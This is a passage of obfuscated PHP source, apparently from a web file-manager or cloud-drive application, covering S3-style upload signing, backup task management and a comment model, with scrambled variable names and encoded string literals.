array($çÆÛ¤‹·[262] => $¸òûë”µ); if ($±›ú­åé) { $“ùƒßòÎ[$çÆÛ¤‹·[263]] = $çÆÛ¤‹·[264] . rawurlencode($­Âğ¯); } else { } $ÜÙ”ˆ®· = $this->link($üÊöõì±, $“ùƒßòÎ); $this->fileOutLink($ÜÙ”ˆ®·); } public function fileOutServer($×õÊ÷²‚, $®ÙµŠèš = false, $¦ÓÀ¸»Ø = false, $£‘œ³„ì = '') { parent::fileOut($×õÊ÷²‚, $®ÙµŠèš, $¦ÓÀ¸»Ø, $£‘œ³„ì); } public function fileOutImageServer($‡Ş­»ğ», $—ëÒæè = 250) { parent::fileOutImage($‡Ş­»ğ», $—ëÒæè); } public function hashMd5($±âëøéå, $Åâ‰•İ = '') { $Áˆë¶˜‹ = $this->objectMeta($±âëøéå); if (!$Áˆë¶˜‹) { return !1; } $Åâ‰•İ = $Åâ‰•İ ? $Åâ‰•İ : _get($Áˆë¶˜‹, $_SERVER[ü¢ÙÊñÛ][265]); return $Åâ‰•İ; } public function uploadFormData($·ˆû¸¿Ñ, $Ü‰úïßÓ = 3600) { $—öÏŞâ­ =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->_isClientAsync()) { $¸ÛŠåú = $this->getPreSignedURL($·ˆû¸¿Ñ, $Ü‰úïßÓ, array(), $—öÏŞâ­[266]); return array($—öÏŞâ­[219] => str_replace($—öÏŞâ­[229], $—öÏŞâ­[267], $¸ÛŠåú)); } if (isset($GLOBALS[$—öÏŞâ­[16]][$—öÏŞâ­[103]][$—öÏŞâ­[268]]) && $GLOBALS[$—öÏŞâ­[16]][$—öÏŞâ­[103]][$—öÏŞâ­[268]] == $—öÏŞâ­[241]) { return $this->uploadMultiData($·ˆû¸¿Ñ, $Ü‰úïßÓ); } if ($this->signVer == $—öÏŞâ­[260]) { return $this->uploadFormDataV2($·ˆû¸¿Ñ, $Ü‰úïßÓ); } return $this->uploadFormDataV4($·ˆû¸¿Ñ, $Ü‰úïßÓ); } private function uploadFormDataV2($Õè­ŸÎó, $¤˜æ—ı» = 3600) { $Üƒ„¸úó =& $_SERVER[ü¢ÙÊñÛ]; $§ğŠÈÙ‹ = $this->pathFather($Õè­ŸÎó); $‚€ ßçì = $this->client->getHttpUploadPostParams($this->bucket, $§ğŠÈÙ‹, $Üƒ„¸úó[242], $¤˜æ—ı»); $ã¹Öµ‰ = array_merge((array) $‚€ ßçì, array($Üƒ„¸úó[269] => $Üƒ„¸úó[260], $Üƒ„¸úó[219] => $this->getHost())); if ($this->_isClientAsync()) { unset($ã¹Öµ‰[$Üƒ„¸úó[269]]); } return $ã¹Öµ‰; } private function uploadFormDataV4($š’·´õ, $³³šğğÄ = 3600) { $€ÉË =& $_SERVER[ü¢ÙÊñÛ]; $ÈÕäÛÏØ = $€ÉË[242]; $ì¡ì‹şÕ = $€ÉË[270]; $¸©İÇ® = $€ÉË[73]; $øõ¥¯ = gmdate($€ÉË[271]); $’úªãıœ = gmdate($€ÉË[272]); $¹¦Ù„æÊ = $€ÉË[273]; $ÚĞÌŒõô = $³³šğğÄ . $€ÉË[22]; $‡–çğ£¯ = $€ÉË[274]; $¯ñ‘ÌÒë = array($this->accessKey, $’úªãıœ, $this->region, $¸©İÇ®, $¹¦Ù„æÊ); $âáŸ¼Á = implode($€ÉË[18], $¯ñ‘ÌÒë); $ûğÎşãË = array($€ÉË[275] => gmdate($€ÉË[276], strtotime($€ÉË[277])), $€ÉË[278] => array(array($€ÉË[279] => $this->bucket), array($€ÉË[280], $€ÉË[281], $€ÉË[22]), array($€ÉË[280], $€ÉË[282], $€ÉË[22]), array($€ÉË[283] => $‡–çğ£¯), array($€ÉË[284] => $âáŸ¼Á), array($€ÉË[285] => $ì¡ì‹şÕ), array($€ÉË[286] => $øõ¥¯), array($€ÉË[287] => $ÚĞÌŒõô))); $¸ú˜ŒÏŒ = base64_encode(json_encode($ûğÎşãË)); $œ·¢•™ = hash_hmac($€ÉË[288], $’úªãıœ, $€ÉË[289] . $this->secret, !0); $‚ºãÌóÕ = hash_hmac($€ÉË[288], $this->region, $œ·¢•™, !0); $œˆƒôØ± = hash_hmac($€ÉË[288], $¸©İÇ®, $‚ºãÌóÕ, !0); $³ñäÕå¥ = hash_hmac($€ÉË[288], $¹¦Ù„æÊ, $œˆƒôØ±, !0); $¦µĞÔ = hash_hmac($€ÉË[288], $¸ú˜ŒÏŒ, $³ñäÕå¥); $‘“È¡û© = array($€ÉË[259] => $€ÉË[22], $€ÉË[283] => $‡–çğ£¯, $€ÉË[290] => $¸ú˜ŒÏŒ, $€ÉË[284] => $âáŸ¼Á, $€ÉË[285] => $ì¡ì‹şÕ, $€ÉË[286] => $øõ¥¯, $€ÉË[287] => $ÚĞÌŒõô, $€ÉË[291] => $¦µĞÔ, $€ÉË[269] => $€ÉË[260], $€ÉË[219] => $this->getHost()); if ($this->_isClientAsync()) { unset($‘“È¡û©[$€ÉË[269]]); } return $‘“È¡û©; } public function uploadMultiData($õ®€œ”, $ä”ËİÀ = 3600) { $ñÙ©è¥ =& $_SERVER[ü¢ÙÊñÛ]; $á‚ıãŠ± = $this->signVer == $ñÙ©è¥[260] ? gmdate($ñÙ©è¥[292]) : gmdate($ñÙ©è¥[293]); $–Ó±ƒ¤å = array(); $Õ½‹»‰ = $this->client->getUploadId($this->bucket, $õ®€œ”, $–Ó±ƒ¤å); if (!$Õ½‹»‰) { return !1; } $ìø´íÁ = array($ñÙ©è¥[294] => $Õ½‹»‰, $ñÙ©è¥[219] => $this->getHost() . $ñÙ©è¥[18] . $this->pathEncode($õ®€œ”), $ñÙ©è¥[295] => $á‚ıãŠ±, $ñÙ©è¥[108] => $õ®€œ”, $ñÙ©è¥[269] => $this->signVer); if ($this->_isClientAsync()) { unset($ìø´íÁ[$ñÙ©è¥[269]]); } return $ìø´íÁ; } public function uploadMultiAuth($‚½·µ„ƒ, $½ßÎÆÕ° = array()) { $Ãó†şö =& $_SERVER[ü¢ÙÊñÛ]; if ($this->signVer == $Ãó†şö[260]) { if (isset($½ßÎÆÕ°[$Ãó†şö[296]])) { return $this->uploadPartAuthV2($‚½·µ„ƒ, $½ßÎÆÕ°); } return $this->uploadListAuthV2($‚½·µ„ƒ, $½ßÎÆÕ°); } if (isset($½ßÎÆÕ°[$Ãó†şö[296]])) { return $this->uploadPartAuthV4($‚½·µ„ƒ, $½ßÎÆÕ°); } return $this->uploadListAuthV4($‚½·µ„ƒ, $½ßÎÆÕ°); } private function uploadPartAuthV2($¹› ©Ú†, $¼ˆ¨Û¶Œ = array()) { $Ò†ßÒµ¢ =& $_SERVER[ü¢ÙÊñÛ]; $¡’ÕÍ·‡ = $¼ˆ¨Û¶Œ[$Ò†ßÒµ¢[108]]; $“ÓŒËç = gmdate($Ò†ßÒµ¢[292]); $öİÆš’ = array_intersect_key($¼ˆ¨Û¶Œ, array_flip(array($Ò†ßÒµ¢[296], $Ò†ßÒµ¢[294]))); ksort($öİÆš’); $³§Ø°‰¦ = $öİÆš’ ? $Ò†ßÒµ¢[87] . http_build_query($öİÆš’, null, $Ò†ßÒµ¢[297], PHP_QUERY_RFC3986) : $Ò†ßÒµ¢[22]; $½µä® È = array($Ò†ßÒµ¢[266], $Ò†ßÒµ¢[22], $Ò†ßÒµ¢[134], $Ò†ßÒµ¢[22], "\x78\55\141\x6d\x7a\x2d\x64\x61\164\145\x3a{$“ÓŒËç}", $Ò†ßÒµ¢[18] . $this->bucket . $Ò†ßÒµ¢[18] . $this->pathEncode($¡’ÕÍ·‡) . $³§Ø°‰¦); $µ˜õòê° = implode($Ò†ßÒµ¢[10], $½µä® È); $Ôù¿Çõ˜ = $this->client->__getSignature($µ˜õòê°); return array($Ò†ßÒµ¢[298] => $Ôù¿Çõ˜, $Ò†ßÒµ¢[295] => $“ÓŒËç); } private function uploadListAuthV2($ÀèƒĞàÈ, $ŠÆ°Û¶¾ = array()) { $‡Ù‚²ù¸ =& $_SERVER[ü¢ÙÊñÛ]; $©¦‹©œ = $ŠÆ°Û¶¾[$‡Ù‚²ù¸[108]]; $Ğê±ÀÛû = $ŠÆ°Û¶¾[$‡Ù‚²ù¸[294]]; $ÇÚìæ‡‰ = $this->client->listParts($this->bucket, $©¦‹©œ, $Ğê±ÀÛû); if (!$ÇÚìæ‡‰) { return !1; } $Ö¢ªì‚ = gmdate($‡Ù‚²ù¸[292]); $Ä©”Ò‰’ = $‡Ù‚²ù¸[299] . $Ğê±ÀÛû; $Öø²¾è¤ = array($‡Ù‚²ù¸[300], $‡Ù‚²ù¸[22], $‡Ù‚²ù¸[134], $‡Ù‚²ù¸[22], "\170\x2d\x61\155\172\x2d\144\141\x74\145\72{$Ö¢ªì‚}", $‡Ù‚²ù¸[18] . $this->bucket . $‡Ù‚²ù¸[18] . $this->pathEncode($©¦‹©œ) . $Ä©”Ò‰’); $ Ü…Ü™ = implode($‡Ù‚²ù¸[10], $Öø²¾è¤); $ÙÚÒÊ• = $this->client->__getSignature($ Ü…Ü™); return array($‡Ù‚²ù¸[298] => $ÙÚÒÊ•, $‡Ù‚²ù¸[295] => $Ö¢ªì‚, $‡Ù‚²ù¸[301] => $ÇÚìæ‡‰); } private function uploadPartAuthV4($Ğ‚äÖ¼…, $Â€öªğÕ = array()) { $£Î…Á³ =& $_SERVER[ü¢ÙÊñÛ]; $¥‚éÖß = $Â€öªğÕ[$£Î…Á³[108]]; $á¾®±ˆ = array($£Î…Á³[286] => gmdate($£Î…Á³[293]), $£Î…Á³[302] => _get($Â€öªğÕ, $£Î…Á³[303], hash($£Î…Á³[288], $£Î…Á³[22]))); $‚²îîÜ = explode($£Î…Á³[221], $this->getHost()); $ŠÁ¿Ù¹Œ = array($£Î…Á³[304] => $‚²îîÜ[1], $£Î…Á³[305] => $£Î…Á³[22], $£Î…Á³[259] => $£Î…Á³[134], $£Î…Á³[306] => $Â€öªğÕ[$£Î…Á³[90]]); $§Æœ‡€æ = $£Î…Á³[266]; $Ù›¦Í†Õ = $£Î…Á³[18] . $this->pathEncode($¥‚éÖß); $¾ìô‡õÄ = array_intersect_key($Â€öªğÕ, array_flip(array($£Î…Á³[296], $£Î…Á³[294]))); $Ïò†˜•¼ = $this->client->__getSignatureV4($á¾®±ˆ, $ŠÁ¿Ù¹Œ, $§Æœ‡€æ, $Ù›¦Í†Õ, $¾ìô‡õÄ); return array($£Î…Á³[298] => $Ïò†˜•¼, $£Î…Á³[302] => $á¾®±ˆ[$£Î…Á³[302]], $£Î…Á³[295] => $á¾®±ˆ[$£Î…Á³[286]]); } private function uploadListAuthV4($‚Á§¤å, $ªó“ÃÃ† = array()) { $¿Æª¡›– =& $_SERVER[ü¢ÙÊñÛ]; $êÅ«™Ç = $ªó“ÃÃ†[$¿Æª¡›–[108]]; $¿­ëˆ«¬ = $ªó“ÃÃ†[$¿Æª¡›–[294]]; $¶Äñş‰ = $this->client->listParts($this->bucket, $êÅ«™Ç, $¿­ëˆ«¬); if (!$¶Äñş‰) { return !1; } $µì‚Ô¤Û = $¿Æª¡›–[307]; foreach ($¶Äñş‰ as $ÕÅØÏ©) { $µì‚Ô¤Û .= $¿Æª¡›–[308] . "\74\120\141\162\164\116\x75\x6d\x62\145\x72\76{$ÕÅØÏ©[$¿Æª¡›–[309]]}\74\x2f\120\x61\162\x74\x4e\165\155\142\x65\162\x3e\xa" . "\74\105\124\141\x67\x3e{$ÕÅØÏ©[$¿Æª¡›–[310]]}\x3c\57\x45\124\x61\x67\76\xa" . $¿Æª¡›–[311]; } $µì‚Ô¤Û .= $¿Æª¡›–[312]; $¹ÒÂ’“İ = array($¿Æª¡›–[286] => gmdate($¿Æª¡›–[293]), $¿Æª¡›–[302] => hash($¿Æª¡›–[288], $µì‚Ô¤Û)); $îØ†Ä¥ö = explode($¿Æª¡›–[221], $this->getHost()); $—Áğº¶é = array($¿Æª¡›–[304] => $îØ†Ä¥ö[1], $¿Æª¡›–[259] => $¿Æª¡›–[134], $¿Æª¡›–[306] => strlen($µì‚Ô¤Û)); $À®¿³ìĞ = $¿Æª¡›–[300]; $×ß·˜ëŸ = $¿Æª¡›–[18] . $this->pathEncode($êÅ«™Ç); $¤ÃÁ¼ÂŞ = array($¿Æª¡›–[294] => $¿­ëˆ«¬); $‚î¾š–» = $this->client->__getSignatureV4($¹ÒÂ’“İ, $—Áğº¶é, $À®¿³ìĞ, $×ß·˜ëŸ, $¤ÃÁ¼ÂŞ); return array($¿Æª¡›–[298] => $‚î¾š–», $¿Æª¡›–[302] => $¹ÒÂ’“İ[$¿Æª¡›–[302]], $¿Æª¡›–[295] => $¹ÒÂ’“İ[$¿Æª¡›–[286]], $¿Æª¡›–[301] => $¶Äñş‰); } private function _isClientAsync() { $Ë·ò¹íˆ =& $_SERVER[ü¢ÙÊñÛ]; static $›ÖÈ¤ùä = null; if ($›ÖÈ¤ùä === null) { $ˆŒ”×‹ª = isset($_REQUEST[$Ë·ò¹íˆ[313]]) ? json_decode($_REQUEST[$Ë·ò¹íˆ[313]], !0) : !1; $›ÖÈ¤ùä = $ˆŒ”×‹ª && _get($ˆŒ”×‹ª, $Ë·ò¹íˆ[314]) == $Ë·ò¹íˆ[315]; } return $›ÖÈ¤ùä; } public function getHost() { $ ŞÏ»è¬ =& $_SERVER[ü¢ÙÊñÛ]; $àúõéÉæ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ ŞÏ»è¬[81], $ ŞÏ»è¬[75], $ ŞÏ»è¬[80], $ ŞÏ»è¬[73]))) { return $àúõéÉæ . $ ŞÏ»è¬[18] . $this->bucket; } if ($this->osType == $ ŞÏ»è¬[73] && !is_domain($àúõéÉæ)) { return $àúõéÉæ . $ ŞÏ»è¬[18] . $this->bucket; } $àúõéÉæ = explode($ ŞÏ»è¬[221], $àúõéÉæ); return $àúõéÉæ[0] . $ ŞÏ»è¬[221] . $this->bucket . $ ŞÏ»è¬[20] . $àúõéÉæ[1]; } public function size($õ½ı«Í€) { $§ß¾òî = $this->objectMeta($õ½ı«Í€); return $§ß¾òî ? $§ß¾òî[$_SERVER[ü¢ÙÊñÛ][90]] : 0; } public function info($¸êÊ›ºã) { if ($this->isFolder($¸êÊ›ºã)) { return $this->folderInfo($¸êÊ›ºã); } else { if ($this->isFile($¸êÊ›ºã)) { return $this->fileInfo($¸êÊ›ºã); } } return !1; } public function exist($ğÄÙ˜) { return $this->isFile($ğÄÙ˜) || $this->isFolder($ğÄÙ˜); } public function isFile($ÎÏä„óÅ) { return !$this->isFolder($ÎÏä„óÅ) && $this->objectMeta($ÎÏä„óÅ); } public function isFolder($‹üõÛòÌ) { return $this->cacheMethod($_SERVER[ü¢ÙÊñÛ][190], $‹üõÛòÌ); } protected function objectMeta($ä×§ØÕ¡) { return $this->cacheMethod($_SERVER[ü¢ÙÊñÛ][192], $ä×§ØÕ¡); } protected function _objectMeta($×»üßÜç) { $©İ»öŸà =& $_SERVER[ü¢ÙÊñÛ]; $×»üßÜç = rtrim($×»üßÜç, $©İ»öŸà[18]); try { $êğóÑëå = $this->client->getObjectInfo($this->bucket, $×»üßÜç); if (!isset($êğóÑëå[$©İ»öŸà[265]]) && isset($êğóÑëå[$©İ»öŸà[316]])) { $êğóÑëå[$©İ»öŸà[265]] = $êğóÑëå[$©İ»öŸà[316]]; } } catch (Exception $î•‰ßŸ) { $êğóÑëå = !1; } if (!$êğóÑëå) { } return $êğóÑëå; } protected function _isFolder($•š˜Í¾›) { $Î—ü¼å =& $_SERVER[ü¢ÙÊñÛ]; $•š˜Í¾› = rtrim($•š˜Í¾›, $Î—ü¼å[18]) . $Î—ü¼å[18]; if ($•š˜Í¾› == $Î—ü¼å[22] || $•š˜Í¾› == $Î—ü¼å[18]) { return !0; } $æóò–¿ = $this->client->getBucket($this->bucket, $•š˜Í¾›, null, 1); if (empty($æóò–¿[$Î—ü¼å[249]])) { return !1; } $ä¡Ñƒ = $æóò–¿[$Î—ü¼å[249]][0][$Î—ü¼å[42]]; return stripos($ä¡Ñƒ, $•š˜Í¾›) === 0 ? !0 : !1; if (substr($ä¡Ñƒ, -1) == $Î—ü¼å[18]) { return !0; } if (get_path_this($ä¡Ñƒ) == get_path_this($•š˜Í¾›)) { return !1; } return !0; } public function listObject($„Œˆé‚™) { return $this->fileList($„Œˆé‚™, $_SERVER[ü¢ÙÊñÛ][22], !0); } } goto AÆëÇ‚ËÖ; BèèèŠÚš: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\x2e\142\141\143\x6b\165\x70\114\151\x73\164"; public $field = array("\x69\x6f", "\x6e\x61\x6d\145", "\163\x74\x61\x74\x75\163", "\143\157\x6e\x74\x65\156\164", "\x6d\x61\x6e\165\x61\154", "\x72\145\x73\x75\x6c\164", "\x74\x69\x6d\145\x46\x72\157\155", "\x74\x69\x6d\145\x54\157"); public function config() { $Ê«ÁÀüƒ =& $_SERVER[ü¢ÙÊñÛ]; Action($Ê«ÁÀüƒ[1984])->taskInit(); $úÄøªÃ = Model($Ê«ÁÀüƒ[835])->get($Ê«ÁÀüƒ[849]); $úÄøªÃ = json_decode($úÄøªÃ, !0); $úÄøªÃ = is_array($úÄøªÃ) ? $úÄøªÃ : array(); $this->parseContent($úÄøªÃ); unset($úÄøªÃ[$Ê«ÁÀüƒ[1728]]); Model($Ê«ÁÀüƒ[1727])->cacheClear(); $óÑ„àúÌ = $Ê«ÁÀüƒ[1985]; $— ğÜ¨ö = Model($Ê«ÁÀüƒ[1986])->findByKey($Ê«ÁÀüƒ[1746], $óÑ„àúÌ); if (!$— ğÜ¨ö) { $— ğÜ¨ö = array(); } if (isset($— ğÜ¨ö[$Ê«ÁÀüƒ[217]])) { $— ğÜ¨ö[$Ê«ÁÀüƒ[217]] = json_decode($— ğÜ¨ö[$Ê«ÁÀüƒ[217]], !0); } if (isset($úÄøªÃ[$Ê«ÁÀüƒ[217]])) { $— ğÜ¨ö[$Ê«ÁÀüƒ[217]][$Ê«ÁÀüƒ[1731]] = $úÄøªÃ[$Ê«ÁÀüƒ[217]]; unset($úÄøªÃ[$Ê«ÁÀüƒ[217]]); } return array_merge($— ğÜ¨ö, $úÄøªÃ); } public function listData($Ï²’ˆÀ˜ = false, $á„Ó½æë = "\155\157\144\151\x66\x79\x54\151\x6d\145", $‘ÑÏâ©á = false) { $–¡¨áæ = parent::listData($Ï²’ˆÀ˜, $á„Ó½æë, !0); if (!$–¡¨áæ) { return $–¡¨áæ; } if ($Ï²’ˆÀ˜) { $–¡¨áæ = array($–¡¨áæ); } foreach ($–¡¨áæ as &$Ş°ÏÀÁø) { $this->parseContent($Ş°ÏÀÁø); } return $Ï²’ˆÀ˜ ? $–¡¨áæ[0] : $–¡¨áæ; } public function parseContent(&$şëúÎÊÁ) { $†¨Üå‰À =& $_SERVER[ü¢ÙÊñÛ]; $ãûû÷¢ = _get($şëúÎÊÁ, $†¨Üå‰À[182], $†¨Üå‰À[102]); if (!in_array($ãûû÷¢, array($†¨Üå‰À[841], $†¨Üå‰À[1198]))) { $şëúÎÊÁ[$†¨Üå‰À[182]] = $ãûû÷¢ == $†¨Üå‰À[102] ? $†¨Üå‰À[1198] : $†¨Üå‰À[841]; } } public function lastItem() { $ÛÕŞ™‹Ô = $this->listData(); return !empty($ÛÕŞ™‹Ô[0]) ? $ÛÕŞ™‹Ô[0] : null; } public function kill($Ê¡êìÅ) { $ĞèİØ  =& $_SERVER[ü¢ÙÊñÛ]; $‡şà×úñ = $this->listData($Ê¡êìÅ); if (!$‡şà×úñ || empty($‡şà×úñ[$ĞèİØ [42]])) { return !0; } Task::kill($ĞèİØ [848]); Task::kill($ĞèİØ [866]); Task::kill($ĞèİØ [875]); $„§—‰‰ª = $‡şà×úñ[$ĞèİØ [42]]; $†üØ‹¬â = TEMP_FILES . $ĞèİØ [844] . $„§—‰‰ª . $ĞèİØ [18]; IO::remove($†üØ‹¬â, !1); return $this->remove($Ê¡êìÅ); } public function remove($Ü€’Ó š) { $‰¯éó™¡ = $this->listData($Ü€’Ó š); if (!$‰¯éó™¡) { return !0; } return $this->backupRemove($‰¯éó™¡); } private function backupRemove($œÉˆ£úÛ) { parent::remove($œÉˆ£úÛ[$_SERVER[ü¢ÙÊñÛ][486]]); $ú‰¿ÔÂ¸ = $this->backupPath($œÉˆ£úÛ); IO::remove($ú‰¿ÔÂ¸, !1); return !0; } private function backupPath($Õ§‡İ•ó) { $…‹İåÁ =& $_SERVER[ü¢ÙÊñÛ]; $¿Ì×øÃĞ = $Õ§‡İ•ó[$…‹İåÁ[42]]; $‚ôøßà÷ = Model($…‹İåÁ[835])->get($…‹İåÁ[836]); $½’ÓŸ€û = substr(md5($…‹İåÁ[837] . $‚ôøßà÷ . $¿Ì×øÃĞ), 0, 8); return "\x7b\x69\x6f\x3a{$Õ§‡İ•ó[$…‹İåÁ[817]]}\175\57\144\x61\164\x61\142\x61\x73\145\x2f\x62\x61\x63\153\x75\x70\x2f" . $¿Ì×øÃĞ . $…‹İåÁ[21] . $½’ÓŸ€û; } public function start() { $ƒúÂ¿È’ =& $_SERVER[ü¢ÙÊñÛ]; if ($GLOBALS[$ƒúÂ¿È’[16]][$ƒúÂ¿È’[103]][$ƒúÂ¿È’[1987]] != $ƒúÂ¿È’[102]) { return !0; } $ã¾á¡ŠÈ = $this->config(); if (!$ã¾á¡ŠÈ || $ã¾á¡ŠÈ[$ƒúÂ¿È’[1728]] != $ƒúÂ¿È’[102]) { return !1; } if ($ã¾á¡ŠÈ[$ƒúÂ¿È’[182]] == $ƒúÂ¿È’[841]) { $öş¨×Ê¿ = Model($ƒúÂ¿È’[835])->get($ƒúÂ¿È’[1313]); if ($öş¨×Ê¿ == $ƒúÂ¿È’[1314]) { $ã¾á¡ŠÈ[$ƒúÂ¿È’[182]] = $ƒúÂ¿È’[1198]; } } $Ò¥ŒÒµú = $this->process(); foreach ($Ò¥ŒÒµú as $”ÏÍ¢ˆ‘) { if ($”ÏÍ¢ˆ‘) { return Task::restart($”ÏÍ¢ˆ‘[$ƒúÂ¿È’[486]]); } } $š¥ı§Ûè = new Backup(); $àæÎóâé = $š¥ı§Ûè->db(); if ($àæÎóâé) { $àæÎóâé = $š¥ı§Ûè->dbFile(); if ($àæÎóâé && $ã¾á¡ŠÈ[$ƒúÂ¿È’[182]] == $ƒúÂ¿È’[841]) { $àæÎóâé = $š¥ı§Ûè->file(); } } Backup::set(array($ƒúÂ¿È’[815] => 1, $ƒúÂ¿È’[826] => time())); return !0; } public function process() { $¶Ûë¦åª =& $_SERVER[ü¢ÙÊñÛ]; $–Ñó§®ğ = array($¶Ûë¦åª[822] => Task::get($¶Ûë¦åª[848]), $¶Ûë¦åª[827] => Task::get($¶Ûë¦åª[866]), $¶Ûë¦åª[243] => Task::get($¶Ûë¦åª[875])); $°¹õ…Å† = !1; foreach ($–Ñó§®ğ as &$—ÌİÒ –) { if ($°¹õ…Å†) { $—ÌİÒ – = !1; continue; } if ($—ÌİÒ –) { $šª×¸âú = intval(_get($—ÌİÒ –, $¶Ûë¦åª[1764], 0)); if (time() - $šª×¸âú > 7200) { Task::kill($—ÌİÒ –[$¶Ûë¦åª[486]]); $°¹õ…Å† = !0; $—ÌİÒ – = !1; } } } return $–Ñó§®ğ; } public function restore() { $Ê¸²÷·Å =& $_SERVER[ü¢ÙÊñÛ]; ActionCall($Ê¸²÷·Å[1126], !0, 1); ActionCall($Ê¸²÷·Å[1126], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\x6d\145\x6e\x74"; protected $tableMeta = array("\164\x61\x62\154\x65\116\x61\155\145" => "\x63\x6f\x6d\x6d\x65\156\164\137\155\145\164\141", "\155\x65\x74\x61\106\151\145\x6c\144" => "\x63\157\155\155\x65\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ç¥ã¼ù†) { $Ï«õìö =& $_SERVER[ü¢ÙÊñÛ]; if ($ç¥ã¼ù†[$Ï«õìö[1988]]) { $‘ı©ôï = $this->where(array($Ï«õìö[1989] => $ç¥ã¼ù†[$Ï«õìö[1988]]))->find(); if (!$‘ı©ôï || $‘ı©ôï[$Ï«õìö[201]] != $ç¥ã¼ù†[$Ï«õìö[201]] || $‘ı©ôï[$Ï«õìö[580]] != $ç¥ã¼ù†[$Ï«õìö[580]]) { return !1; } $this->where(array($Ï«õìö[1989] => $ç¥ã¼ù†[$Ï«õìö[1988]]))->setAdd($Ï«õìö[1990], 1); } $ç¥ã¼ù†[$Ï«õìö[1991]] = 0; $ç¥ã¼ù†[$Ï«õìö[1990]] = 0; $ç¥ã¼ù†[$Ï«õìö[815]] = 1; return $this->add($ç¥ã¼ù†); } public function commentCount($ş¦´«‹, $µµÖùøİ, $¬»Ö§û = false) { $¥ñ³ëáê =& $_SERVER[ü¢ÙÊñÛ]; if (!$ş¦´«‹) { return array(); } if (is_string($ş¦´«‹) || is_int($ş¦´«‹)) { $ş¦´«‹ = array($ş¦´«‹); } $´Õ¢°Àß = array($¥ñ³ëáê[580], $¥ñ³ëáê[1992] => $¥ñ³ëáê[576]); $ã ıª = array($¥ñ³ëáê[580] => array($¥ñ³ëáê[17], $ş¦´«‹), $¥ñ³ëáê[201] => $µµÖùøİ); if ($¬»Ö§û) { $ã ıª[$¥ñ³ëáê[1759]] = $¬»Ö§û; } $š¶€éÉ² = $this->field($´Õ¢°Àß)->where($ã ıª)->group($¥ñ³ëáê[580])->select(); return array_to_keyvalue($š¶€éÉ², $¥ñ³ëáê[580], $¥ñ³ëáê[576]); } public function starTarget($°²öå—, $¨Œ³ıü¢) { $¾íÙ÷¥ =& $_SERVER[ü¢ÙÊñÛ]; $¡ÊóÇ¥¡ = $°²öå— + self::TYPE_STAR_OFFSET; $ÏÁÀâ = array($¾íÙ÷¥[1759] => USER_ID, $¾íÙ÷¥[201] => $¡ÊóÇ¥¡, $¾íÙ÷¥[580] => $¨Œ³ıü¢); $÷¨ ¥ß = $this->where($ÏÁÀâ)->find(); if ($÷¨ ¥ß) { return $this->where(array($¾íÙ÷¥[486] => $÷¨ ¥ß[$¾íÙ÷¥[486]]))->delete(); } $äÖĞß¹ = array($¾íÙ÷¥[1988] => 0, $¾íÙ÷¥[1759] => USER_ID, $¾íÙ÷¥[815] => 1, $¾íÙ÷¥[182] => $¾íÙ÷¥[22], $¾íÙ÷¥[201] => $¡ÊóÇ¥¡, $¾íÙ÷¥[580] => $¨Œ³ıü¢, $¾íÙ÷¥[1991] => 0, $¾íÙ÷¥[1990] => 0); return $this->add($äÖĞß¹); } public function starTargetCount($¦„½¿Û™, $éÈÈÃ÷Ò) { $Ÿ¿Ø ÕÎ =& $_SERVER[ü¢ÙÊñÛ]; $ÃÃéÌØ§ = $éÈÈÃ÷Ò + self::TYPE_STAR_OFFSET; $ÉÃ¾•ñ” = $this->commentCount($¦„½¿Û™, $ÃÃéÌØ§); $ÌŞä¼ = $this->commentCount($¦„½¿Û™, $ÃÃéÌØ§, USER_ID); return array($Ÿ¿Ø ÕÎ[1993] => $ÉÃ¾•ñ”, $Ÿ¿Ø ÕÎ[1994] => $ÌŞä¼); } public function starTargetUserList($ö—­Áèí, $¾Ø–³ı‹) { $¥İÍ×¤ï =& $_SERVER[ü¢ÙÊñÛ]; $ÚşÙ€˜ = $ö—­Áèí + self::TYPE_STAR_OFFSET; $î¨„èÉ¢ = array($¥İÍ×¤ï[580] => $¾Ø–³ı‹, $¥İÍ×¤ï[201] => $ÚşÙ€˜); $Éí˜ü°¦ = $this->where($î¨„èÉ¢)->count(); $ıíÁ×©ù = array($¥İÍ×¤ï[344] => $Éí˜ü°¦, $¥İÍ×¤ï[1995] => array()); if (!$Éí˜ü°¦) { return $ıíÁ×©ù; } $·ïîÂáÌ = $this->field($¥İÍ×¤ï[1759])->where($î¨„èÉ¢)->limit(500)->select(); $·ïîÂáÌ = array_to_keyvalue($·ïîÂáÌ, $¥İÍ×¤ï[22], $¥İÍ×¤ï[1759]); $ıíÁ×©ù[$¥İÍ×¤ï[1995]] = Model($¥İÍ×¤ï[588])->userListInfo($·ïîÂáÌ); return $ıíÁ×©ù; } public function prasiseUserList($ìËˆàîÌ) { $Ë¬Ôó•ä =& $_SERVER[ü¢ÙÊñÛ]; $Ô‰Ú‘şÇ = array($Ë¬Ôó•ä[1996] => $ìËˆàîÌ); $‚‡¸±ö = $this->where($Ô‰Ú‘şÇ)->find(); $·ü×¡àÀ = _get($‚‡¸±ö, $Ë¬Ôó•ä[1991], 0); $‘óâŠƒİ = array($Ë¬Ôó•ä[344] => $·ü×¡àÀ, $Ë¬Ôó•ä[1995] => array()); if (!$·ü×¡àÀ) { return $‘óâŠƒİ; } $ù²››„Á = Model($Ë¬Ôó•ä[1997])->field($Ë¬Ôó•ä[1759])->where($Ô‰Ú‘şÇ)->limit(500)->select(); $ù²››„Á = array_to_keyvalue($ù²››„Á, $Ë¬Ôó•ä[22], $Ë¬Ôó•ä[1759]); $‘óâŠƒİ[$Ë¬Ôó•ä[1995]] = Model($Ë¬Ôó•ä[588])->userListInfo($ù²››„Á); return $‘óâŠƒİ; } public function remove($…öÊØ£ş) { $ĞÒùÛÀï =& $_SERVER[ü¢ÙÊñÛ]; $˜¨Ù«ÜÍ = array($ĞÒùÛÀï[1989] => $…öÊØ£ş); $‚’Ô¿é = $this->where($˜¨Ù«ÜÍ)->find(); if ($‚’Ô¿é[$ĞÒùÛÀï[1988]]) { 